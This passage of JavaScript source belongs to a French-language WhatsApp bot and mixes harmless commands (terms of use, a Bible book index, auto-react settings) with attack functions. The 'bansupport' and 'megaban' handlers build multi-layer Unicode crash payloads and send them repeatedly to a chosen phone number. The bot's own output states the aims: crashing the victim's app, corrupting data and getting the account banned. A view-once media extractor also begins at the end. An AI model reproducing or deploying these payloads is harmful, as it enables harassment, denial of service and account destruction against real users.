    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
    
    // Construction du payload multicouche
    const ban = 
      arabicChars.repeat(500) + 
      invisibleChars.repeat(1000) + 
      chineseChars.repeat(300) + 
      zalgoChars.repeat(200) +
      '🪲'.repeat(5000) +
      '\u202E' + // RTL Override
      arabicChars.repeat(500) +
      '\uFEFF'.repeat(1000) + //   no-break space
      chineseChars.repeat(500);
    
    // Message de contexte malveillant
    const contextMessage = {
      text: ban,
      contextInfo: {
        mentionedJid: [targetJid],
        externalAdReply: {
          title: arabicChars + invisibleChars,
          body: chineseChars + zalgoChars,
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    };
    
    // Envoyer 5 messages consécutifs pour maximiser l'effet
    for (let i = 0; i < 5; i++) {
      await sock.sendMessage(targetJid, contextMessage);
      await delay(300);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
  ⌬ **PAYLOAD** » Multi-layer Ban

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **PAYLOAD INJECTÉ:**

✅  : 1000+ chars
✅  : 800+ chars
✅   : 2000+ chars
✅ RTL Override: 
✅   chars: 1000+ chars
✅ Zalgo text: 200+ chars

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **EFFETS ATTENDUS:**

🔴   de WhatsApp
🔴 Corruption de la base de données
🔴 Impossibilité de rouvrir l'app
🔴 Ban automatique sous 1-6h
🔴 Possible ban permanent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ** :**
• 0-5min: Crash de l'application
• 5min-1h: Détection par WhatsApp
• 1-6h: Ban automatique
• 6-48h: Review du compte

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Ultimate Ban System*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`💀 Ban Support envoyé à ${targetJid}`);
    
  } catch (error) {
    console.error(' bansupport:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  du Ban Support\n\n: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// MEGABAN - Attack ultime with tous les caractères
async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `💀 *MEGA BAN - ULTIMATE ATTACK*

• Utilisation:
• ${config.prefix}megaban @mention
• ${config.prefix}xcrash 50944908407

⚠️ *ATTENTION EXTRÊME:*
Cette commande combine TOUS les payloads:
• 10 messages consécutifs
• Arabe + Chinois + Invisible
• RTL + Zalgo + Emoji
• Context corruption
• Media exploit

🔴 *RÉSULTAT:*
Ban permanent quasi-garanti`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `💀 **MEGA BAN INITIATED**

⏳  de l'arsenal complet...
📊 [░░░░░░░░░░] 0%

Target: @${targetJid.split('@')[0]}`,
    mentions: [targetJid]
  });
  
  try {
    // PAYLOADS MAXIMAUX
    const arabicFull = '܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
    
    const totalMessages = 10;
    
    for (let i = 0; i < totalMessages; i++) {
      // Construire un payload unique à chaque fois
      const mega = 
        arabicFull.repeat(800) +
        invisibleFull.repeat(2000) +
        chineseFull.repeat(600) +
        zalgoFull.repeat(400) +
        emojiFlood.repeat(1000) +
        '\u202E\u202D\u202C' + // Multiple RTL
        arabicFull.repeat(500) +
        '\uFEFF'.repeat(1500) +
        chineseFull.repeat(800) +
        invisibleFull.repeat(1000);
      
      // Message with context malveillant
      const contextMsg = {
        text: mega,
        contextInfo: {
          mentionedJid: [targetJid],
          externalAdReply: {
            title: arabicFull + invisibleFull + zalgoFull,
            body: chineseFull + emojiFlood.repeat(100),
            mediaType: 2,
            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://' + arabicFull + chineseFull
          }
        }
      };
      
      await sock.sendMessage(targetJid, contextMsg);
      
      // Update progression
      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
      
      await sock.sendMessage(remoteJid, {
        text: `💀 **MEGA BAN EN COURS**

📊 [${progressBar}] ${percentage}%
📨 : ${i + 1}/${totalMessages}

Target: @${targetJid.split('@')[0]}`,
        mentions: [targetJid],
        edit: loadingMsg.key
      });
      
      await delay(500);
    }
    
    // Message final
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
  ⌬ **MESSAGES** » 10/10 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **ARSENAL DÉPLOYÉ:**

✅  : 13,000+
✅  : 14,000+
✅ Chars invisibles: 30,000+
✅ Zalgo corruption: 4,000+
✅ Emoji flood: 10,000+
✅ RTL overrides: Multiple
✅ Context corruption: Maximum
✅ Total payload: ~200KB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 **DÉGÂTS ATTENDUS:**

🔴 Crash permanent de WhatsApp
🔴 Corruption totale des données
🔴 Impossibilité de récupération
🔴 Ban automatique immédiat
🔴 Compte détruit définitivement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **TIMELINE DE DESTRUCTION:**

• 0-1min: Crash total de l'app
• 1-5min: Détection système
• 5-30min: Ban automatique
• 30min-2h: Compte suspendu
• 2-24h: Ban permanent confirmé

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Mega Ban System - Target Eliminated*

⚠️ **Le compte cible est condamné**`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
    
  } catch (error) {
    console.error(' megaban:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  du Mega Ban\n\n: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// CHECK BAN - Vérifier si un numéro est banni/spam
async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
  try {
    let targetNumber;
    if (args[0]) {
      targetNumber = args[0].replace(/[^0-9]/g, '');
    } else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
      targetNumber = message.message.extendedTextMessage.contextInfo.participant.split('@')[0];
    } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
      targetNumber = message.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
    } else {
      await sock.sendMessage(remoteJid, {
        text: `❗ Usage: ${config.prefix}check <numéro> ou @mention ou réponds à un message

*© SEIGNEUR TD*`
      });
      return;
    }
    if (!targetNumber || targetNumber.length < 6) {
      await sock.sendMessage(remoteJid, { text: `❌ Numéro invalide.

*© SEIGNEUR TD*` });
      return;
    }
    const loadMsg = await sock.sendMessage(remoteJid, { text: `⏳ Patientez, en cours de vérification du Numéro 🪀\n\n+${targetNumber}...` });
    const jid = targetNumber + '@s.whatsapp.net';
    let exists = false;
    let realJid = jid;
    try {
      const [result] = await sock.onWhatsApp(jid);
      exists = result?.exists === true;
      if (result?.jid) realJid = result.jid;
    } catch(_e) {}
    const resultText = exists
      ? `✅ *+${targetNumber}* est sur WhatsApp\n📱 JID: ${realJid}\n\n*© SEIGNEUR TD*`
      : `❌ *+${targetNumber}* n'est pas sur WhatsApp ou n'existe pas\n\n*© SEIGNEUR TD*`;
    await sock.sendMessage(remoteJid, { text: resultText, edit: loadMsg.key }).catch(() => {
      sock.sendMessage(remoteJid, { text: resultText });
    });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}

*© SEIGNEUR TD*` });
  }
}

// Fonction helper pour déterminer le pays
function getCountryFromNumber(number) {
  const prefixes = {
    '1': '🇺🇸 USA/Canada',
    '33': '🇫🇷 France',
    '509': ' Haiti',
    '44': '🇬🇧 UK',
    '62': '🇮🇩 Indonesia',
    '91': '🇮🇳 India',
    '55': '🇧🇷 Brazil',
    '234': '🇳🇬 Nigeria',
    '254': '🇰🇪 Kenya',
    '27': '🇿🇦 South Africa'
  };

  for (const [prefix, country] of Object.entries(prefixes)) {
    if (number.startsWith(prefix)) {
      return country;
    }
  }
  return '🌍 International';
}

// Fonction helper pour les recommandations
function getRiskRecommendation(risk) {
  if (risk >= 70) {
    return `🚨 *HAUTE ALERTE*
⚠️ Ce numéro présente des signes de ban/spam
❌ Évitez d'interagir with ce contact
🛡️ : BLOQUER`;
  } else if (risk >= 40) {
    return `⚠️ *VIGILANCE REQUISE*
⚡ Risque modéré détecté
🔍 Vérifiez l'identité avant d'interagir
🛡️ : PRUDENCE`;
  } else {
    return `✅ *SÉCURISÉ*
🟢 Aucun signe de ban/spam détecté
✔️ Vous pouvez interagir normalement
🛡️ : OK`;
  }
}

// TERMES ET CONDITIONS
async function handleTermsCommand(sock, remoteJid, senderJid) {
  const userName = senderJid.split('@')[0];
  
  const termsText = `╔═══════════════════════════════════╗
║  📜 𝗧𝗘𝗥𝗠𝗘𝗦 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦  ║
╚═══════════════════════════════════╝

⚠️ **RÈGLES D'UTILISATION DU BOT**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **1. UTILISATION RESPONSABLE**

• Le bot est fourni "tel quel" sans garantie
• L'utilisateur est responsable de son usage
• Toute utilisation abusive est interdite
• Respectez les autres utilisateurs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚫 **2. INTERDICTIONS STRICTES**

• ❌ Spam ou flood de commandes
• ❌ Contenu illégal ou offensant
• ❌ Harcèlement d'autres membres
• ❌ Utilisation pour escroquerie
• ❌ Diffusion de malware/virus
• ❌ Contournement des restrictions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 **3. DONNÉES & CONFIDENTIALITÉ**

• Vos messages ne sont pas stockés
• Les commandes sont temporaires
• Aucune donnée vendue à des tiers
• Logs techniques uniquement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ **4. RESPONSABILITÉ LÉGALE**

• Le développeur n'est pas responsable:
  - De l'usage que vous faites du bot
  - Des dommages causés par le bot
  - Des interruptions de service
  - Des pertes de données

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👮 **5. MODÉRATION**

Le développeur se réserve le droit de:
• Bannir tout utilisateur abusif
• Modifier les fonctionnalités
• Suspendre le service
• Supprimer du contenu inapproprié

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **6. PROPRIÉTÉ INTELLECTUELLE**

• Le bot et son code sont protégés
• Redistribution interdite sans accord
• Modification du code interdite
• Crédits obligatoires

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **7. MODIFICATIONS**

Ces termes peuvent être modifiés à tout
moment sans préavis. Votre utilisation
continue constitue votre acceptation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **ACCEPTATION**

En utilisant ce bot, vous acceptez
pleinement ces termes et conditions.

Si vous n'acceptez pas, cessez
immédiatement d'utiliser le bot.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 **CONTACT & SUPPORT**

• Dev: SEIGNEUR TD
• Bot: SEIGNEUR TD v4.0.0
• Pour signaler un problème: 
  Contactez l'administrateur

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"Utilisez with sagesse et respect"

✦ Dernière mise à jour: 06/02/2026`;

  await sock.sendMessage(remoteJid, {
    text: termsText,
    mentions: [senderJid]
  });
}

// BIBLE - Base de données complète des livres de la Bible
async function handleBibleCommand(sock, args, remoteJid) {
  // Ancien Testament (39 livres)
  const ancienTestament = {
    'genese': { nom: 'Genèse', chapitres: 50, testament: 'Ancien' },
    'exode': { nom: 'Exode', chapitres: 40, testament: 'Ancien' },
    'levitique': { nom: 'Lévitique', chapitres: 27, testament: 'Ancien' },
    'nombres': { nom: 'Nombres', chapitres: 36, testament: 'Ancien' },
    'deuteronome': { nom: 'Deutéronome', chapitres: 34, testament: 'Ancien' },
    'josue': { nom: 'Josué', chapitres: 24, testament: 'Ancien' },
    'juges': { nom: 'Juges', chapitres: 21, testament: 'Ancien' },
    'ruth': { nom: 'Ruth', chapitres: 4, testament: 'Ancien' },
    '1samuel': { nom: '1 Samuel', chapitres: 31, testament: 'Ancien' },
    '2samuel': { nom: '2 Samuel', chapitres: 24, testament: 'Ancien' },
    '1rois': { nom: '1 Rois', chapitres: 22, testament: 'Ancien' },
    '2rois': { nom: '2 Rois', chapitres: 25, testament: 'Ancien' },
    '1chroniques': { nom: '1 Chroniques', chapitres: 29, testament: 'Ancien' },
    '2chroniques': { nom: '2 Chroniques', chapitres: 36, testament: 'Ancien' },
    'esdras': { nom: 'Esdras', chapitres: 10, testament: 'Ancien' },
    'nehemie': { nom: 'Néhémie', chapitres: 13, testament: 'Ancien' },
    'esther': { nom: 'Esther', chapitres: 10, testament: 'Ancien' },
    'job': { nom: 'Job', chapitres: 42, testament: 'Ancien' },
    'psaumes': { nom: 'Psaumes', chapitres: 150, testament: 'Ancien' },
    'proverbes': { nom: 'Proverbes', chapitres: 31, testament: 'Ancien' },
    'ecclesiaste': { nom: 'Ecclésiaste', chapitres: 12, testament: 'Ancien' },
    'cantique': { nom: 'Cantique des Cantiques', chapitres: 8, testament: 'Ancien' },
    'esaie': { nom: 'Ésaïe', chapitres: 66, testament: 'Ancien' },
    'jeremie': { nom: 'Jérémie', chapitres: 52, testament: 'Ancien' },
    'lamentations': { nom: 'Lamentations', chapitres: 5, testament: 'Ancien' },
    'ezechiel': { nom: 'Ézéchiel', chapitres: 48, testament: 'Ancien' },
    'daniel': { nom: 'Daniel', chapitres: 12, testament: 'Ancien' },
    'osee': { nom: 'Osée', chapitres: 14, testament: 'Ancien' },
    'joel': { nom: 'Joël', chapitres: 3, testament: 'Ancien' },
    'amos': { nom: 'Amos', chapitres: 9, testament: 'Ancien' },
    'abdias': { nom: 'Abdias', chapitres: 1, testament: 'Ancien' },
    'jonas': { nom: 'Jonas', chapitres: 4, testament: 'Ancien' },
    'michee': { nom: 'Michée', chapitres: 7, testament: 'Ancien' },
    'nahum': { nom: 'Nahum', chapitres: 3, testament: 'Ancien' },
    'habacuc': { nom: 'Habacuc', chapitres: 3, testament: 'Ancien' },
    'sophonie': { nom: 'Sophonie', chapitres: 3, testament: 'Ancien' },
    'aggee': { nom: 'Aggée', chapitres: 2, testament: 'Ancien' },
    'zacharie': { nom: 'Zacharie', chapitres: 14, testament: 'Ancien' },
    'malachie': { nom: 'Malachie', chapitres: 4, testament: 'Ancien' }
  };

  // Nouveau Testament (27 livres)
  const nouveauTestament = {
    'matthieu': { nom: 'Matthieu', chapitres: 28, testament: 'Nouveau' },
    'marc': { nom: 'Marc', chapitres: 16, testament: 'Nouveau' },
    'luc': { nom: 'Luc', chapitres: 24, testament: 'Nouveau' },
    'jean': { nom: 'Jean', chapitres: 21, testament: 'Nouveau' },
    'actes': { nom: 'Actes des Apôtres', chapitres: 28, testament: 'Nouveau' },
    'romains': { nom: 'Romains', chapitres: 16, testament: 'Nouveau' },
    '1corinthiens': { nom: '1 Corinthiens', chapitres: 16, testament: 'Nouveau' },
    '2corinthiens': { nom: '2 Corinthiens', chapitres: 13, testament: 'Nouveau' },
    'galates': { nom: 'Galates', chapitres: 6, testament: 'Nouveau' },
    'ephesiens': { nom: 'Éphésiens', chapitres: 6, testament: 'Nouveau' },
    'philippiens': { nom: 'Philippiens', chapitres: 4, testament: 'Nouveau' },
    'colossiens': { nom: 'Colossiens', chapitres: 4, testament: 'Nouveau' },
    '1thessaloniciens': { nom: '1 Thessaloniciens', chapitres: 5, testament: 'Nouveau' },
    '2thessaloniciens': { nom: '2 Thessaloniciens', chapitres: 3, testament: 'Nouveau' },
    '1timothee': { nom: '1 Timothée', chapitres: 6, testament: 'Nouveau' },
    '2timothee': { nom: '2 Timothée', chapitres: 4, testament: 'Nouveau' },
    'tite': { nom: 'Tite', chapitres: 3, testament: 'Nouveau' },
    'philemon': { nom: 'Philémon', chapitres: 1, testament: 'Nouveau' },
    'hebreux': { nom: 'Hébreux', chapitres: 13, testament: 'Nouveau' },
    'jacques': { nom: 'Jacques', chapitres: 5, testament: 'Nouveau' },
    '1pierre': { nom: '1 Pierre', chapitres: 5, testament: 'Nouveau' },
    '2pierre': { nom: '2 Pierre', chapitres: 3, testament: 'Nouveau' },
    '1jean': { nom: '1 Jean', chapitres: 5, testament: 'Nouveau' },
    '2jean': { nom: '2 Jean', chapitres: 1, testament: 'Nouveau' },
    '3jean': { nom: '3 Jean', chapitres: 1, testament: 'Nouveau' },
    'jude': { nom: 'Jude', chapitres: 1, testament: 'Nouveau' },
    'apocalypse': { nom: 'Apocalypse', chapitres: 22, testament: 'Nouveau' }
  };

  const touteLaBible = { ...ancienTestament, ...nouveauTestament };

  // Si aucun argument, afficher le menu
  if (!args[0]) {
    const menuText = `╔═══════════════════════════════════╗
║       📖 𝗟𝗔 𝗦𝗔𝗜𝗡𝗧𝗘 𝗕𝗜𝗕𝗟𝗘       ║
╚═══════════════════════════════════╝

📚 *Utilisation:*
!bible ancien - Ancien Testament (39 livres)
!bible nouveau - Nouveau Testament (27 livres)
!bible liste - Liste complète (66 livres)
!bible [livre] - Info sur un livre

📝 *Exemples:*
!bible genese
!bible matthieu
!bible psaumes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"La parole de Dieu est vivante"`;

    await sendWithImage(sock, remoteJid, 'bible', menuText);
    return;
  }

  const commande = args[0].toLowerCase();

  // Liste de l'Ancien Testament
  if (commande === 'ancien') {
    let texte = `╔═══════════════════════════════════╗
║   📜 𝗔𝗡𝗖𝗜𝗘𝗡 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧    ║
╚═══════════════════════════════════╝

📚 *39 livres de l'Ancien Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PENTATEUQUE (5):*
1. Genèse (50 ch.)
2. Exode (40 ch.)
3. Lévitique (27 ch.)
4. Nombres (36 ch.)
5. Deutéronome (34 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES HISTORIQUES (12):*
6. Josué (24 ch.)
7. Juges (21 ch.)
8. Ruth (4 ch.)
9. 1 Samuel (31 ch.)
10. 2 Samuel (24 ch.)
11. 1 Rois (22 ch.)
12. 2 Rois (25 ch.)
13. 1 Chroniques (29 ch.)
14. 2 Chroniques (36 ch.)
15. Esdras (10 ch.)
16. Néhémie (13 ch.)
17. Esther (10 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES POÉTIQUES (5):*
18. Job (42 ch.)
19. Psaumes (150 ch.)
20. Proverbes (31 ch.)
21. Ecclésiaste (12 ch.)
22. Cantique des Cantiques (8 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *GRANDS PROPHÈTES (5):*
23. Ésaïe (66 ch.)
24. Jérémie (52 ch.)
25. Lamentations (5 ch.)
26. Ézéchiel (48 ch.)
27. Daniel (12 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PETITS PROPHÈTES (12):*
28. Osée (14 ch.)
29. Joël (3 ch.)
30. Amos (9 ch.)
31. Abdias (1 ch.)
32. Jonas (4 ch.)
33. Michée (7 ch.)
34. Nahum (3 ch.)
35. Habacuc (3 ch.)
36. Sophonie (3 ch.)
37. Aggée (2 ch.)
38. Zacharie (14 ch.)
39. Malachie (4 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste du Nouveau Testament
  if (commande === 'nouveau') {
    let texte = `╔═══════════════════════════════════╗
║   ✝️ 𝗡𝗢𝗨𝗩𝗘𝗔𝗨 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧  ║
╚═══════════════════════════════════╝

📚 *27 livres du Nouveau Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉVANGILES (4):*
1. Matthieu (28 ch.)
2. Marc (16 ch.)
3. Luc (24 ch.)
4. Jean (21 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *HISTOIRE (1):*
5. Actes des Apôtres (28 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES DE PAUL (13):*
6. Romains (16 ch.)
7. 1 Corinthiens (16 ch.)
8. 2 Corinthiens (13 ch.)
9. Galates (6 ch.)
10. Éphésiens (6 ch.)
11. Philippiens (4 ch.)
12. Colossiens (4 ch.)
13. 1 Thessaloniciens (5 ch.)
14. 2 Thessaloniciens (3 ch.)
15. 1 Timothée (6 ch.)
16. 2 Timothée (4 ch.)
17. Tite (3 ch.)
18. Philémon (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES GÉNÉRALES (8):*
19. Hébreux (13 ch.)
20. Jacques (5 ch.)
21. 1 Pierre (5 ch.)
22. 2 Pierre (3 ch.)
23. 1 Jean (5 ch.)
24. 2 Jean (1 ch.)
25. 3 Jean (1 ch.)
26. Jude (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *APOCALYPSE (1):*
27. Apocalypse (22 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste complète
  if (commande === 'liste') {
    let texte = `╔═══════════════════════════════════╗
║     📖 𝗟𝗔 𝗕𝗜𝗕𝗟𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘    ║
╚═══════════════════════════════════╝

📊 *Composition de la Bible:*

📜 Ancien Testament: 39 livres
✝️ Nouveau Testament: 27 livres
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📚 *TOTAL: 66 livres*

💡 *Pour voir la liste détaillée:*
• !bible ancien - Voir les 39 livres
• !bible nouveau - Voir les 27 livres

📖 *Pour info sur un livre:*
• !bible [nom du livre]
• : !bible genese

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *Quelques statistiques:*
• Plus long livre: Psaumes (150 ch.)
• Plus court: 2 Jean, 3 Jean, Jude (1 ch.)
• Premier livre: Genèse
• Dernier livre: Apocalypse

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"Toute Écriture est inspirée de Dieu"`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Recherche d'un livre spécifique
  const livreRecherche = commande.toLowerCase().replace(/\s/g, '');
  const livre = touteLaBible[livreRecherche];

  if (livre) {
    const testament = livre.testament === 'Ancien' ? '📜 Ancien Testament' : '✝️ Nouveau Testament';
    const texte = `╔═══════════════════════════════════╗
║        📖 ${livre.nom.toUpperCase()}        ║
╚═══════════════════════════════════╝

${testament}

📊 *Informations:*
• Nombre de chapitres: ${livre.chapitres}
• Testament: ${livre.testament}

💡 *Pour lire ce livre:*
Utilisez votre Bible ou une application
de lecture biblique.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
  } else {
    await sock.sendMessage(remoteJid, {
      text: `❌ Livre "${args[0]}" non trouvé.\n\nUtilisez !bible liste pour voir tous les livres disponibles.`
    });
  }
}

async function handleLeave(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
    return;
  }

  await sock.sendMessage(remoteJid, { 
    text: `\u250C\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2510
Sayonara everyone
\u2514\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2518
\uD83D\uDCA0 _Bot leave. See you soon!_`
  });
  await delay(2000);
  await sock.groupLeave(remoteJid);
}

async function handleAutoReactCommand(sock, args, remoteJid, senderJid, _saveStateFn, _autoReactCurrent) {
  // Compatibilité : si appelé sans _saveStateFn (ancien code), fallback global
  const _setAR = _saveStateFn || ((k, v) => { autoReact = v; });
  const _arNow = typeof _autoReactCurrent !== 'undefined' ? _autoReactCurrent : autoReact;
  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
    return;
  }

  if (args.length === 0) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *Auto-React*\n\nStatut: ${_arNow ? '✅ ON' : '❌ OFF'}\n\n${config.prefix}autoreact on/off\n${config.prefix}autoreact list\n${config.prefix}autoreact add <mot> <emoji>\n${config.prefix}autoreact remove <mot>`
    });
    return;
  }

  const subCommand = args[0].toLowerCase();

  switch (subCommand) {
    case 'on':
      _setAR('autoReact', true);
      saveData();
      await sock.sendMessage(remoteJid, { text: '✅ Auto-React ACTIVÉ' });
      break;

    case 'off':
      _setAR('autoReact', false);
      saveData();
      await sock.sendMessage(remoteJid, { text: '❌ Auto-React DÉSACTIVÉ' });
      break;

    case 'list':
      const wordList = Object.entries(autoreactWords)
        .map(([word, emoji]) => `• ${word} → ${emoji}`)
        .join('\n');
      await sock.sendMessage(remoteJid, {
        text: `📝 *Mots*:\n\n${wordList || 'Aucun'}`
      });
      break;

    case 'add':
      if (args.length < 3) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact add <mot> <emoji>`
        });
        return;
      }
      const wordToAdd = args[1].toLowerCase();
      const emojiToAdd = args.slice(2).join(' ');
      autoreactWords[wordToAdd] = emojiToAdd;
      saveData();
      await sock.sendMessage(remoteJid, {
        text: `✅  : "${wordToAdd}" → ${emojiToAdd}`
      });
      break;

    case 'remove':
      if (args.length < 2) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact remove <mot>`
        });
        return;
      }
      const wordToRemove = args[1].toLowerCase();
      if (autoreactWords[wordToRemove]) {
        delete autoreactWords[wordToRemove];
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✅  : "${wordToRemove}"`
        });
      } else {
        await sock.sendMessage(remoteJid, {
          text: `❌ Mot non trouvé`
        });
      }
      break;

    default:
      await sock.sendMessage(remoteJid, {
        text: `❌ Sous-commande inconnue`
      });
  }
}

async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
  // ── Seul comportement : reply .vv sur un message vu-unique → ouvre dans le chat ──
  // Chercher le message quoté (reply)
  const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedId = message.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quoted && !quotedId) {
    await sock.sendMessage(remoteJid, {
      text: `👁️ *VU UNIQUE*\n\n💡 Réponds à un message *vu unique* avec \`${config.prefix}vv\` pour l'ouvrir dans le chat.\n\n_Ou réponds avec n'importe quel emoji pour recevoir le média en PV._\n\n*© SEIGNEUR TD*`
    }, { quoted: message });
    return;
  }

  try {
    let mediaData = null, mediaType = '', mimetype = '', isGif = false, isPtt = false;

    // 1. Essayer depuis le message quoté directement
    const qVO = quoted?.viewOnceMessageV2 || quoted?.viewOnceMessageV2Extension;
